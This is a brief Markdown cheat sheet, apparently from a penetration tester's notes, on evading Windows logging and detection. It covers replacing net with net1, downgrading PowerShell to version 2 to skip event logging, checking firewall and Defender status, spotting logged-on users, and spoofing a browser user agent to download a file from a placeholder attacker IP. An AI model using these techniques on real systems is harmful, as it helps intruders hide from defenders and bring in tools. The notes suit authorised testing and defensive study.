---
tags:
  - windows
  - evasive
---
# Logging Evasion
## Command Alias
### [[Net]]
`net` can be replaced with `net1` to avoid potential trigger of `net` string.
## Downgrade Powershell
Powershell event logging was introduced with version 3.0 onwards.
```powershell
PS > Get-host
PS > powershell.exe -version 2
```
Check Powershell logs!
# Checking Defenses
## Firewall Checks
```powershell
PS > netsh advfirewall show allprofiles
```
## Windows Defender Check
```cmd
> sc query windefend
```
## Other Anti-Malware Check
```powershell
PS > Get-MpComputerStatus
```
# User Presence
Avoid alerting other logged-on users:
```powershell
PS > qwinsta
```
# User Agent
- Windows
```powershell
PS > [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```
```powershell
PS > $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS > Invoke-WebRequest http://<IP>[:<PORT>]/file -UserAgent $UserAgent -OutFile "file"
```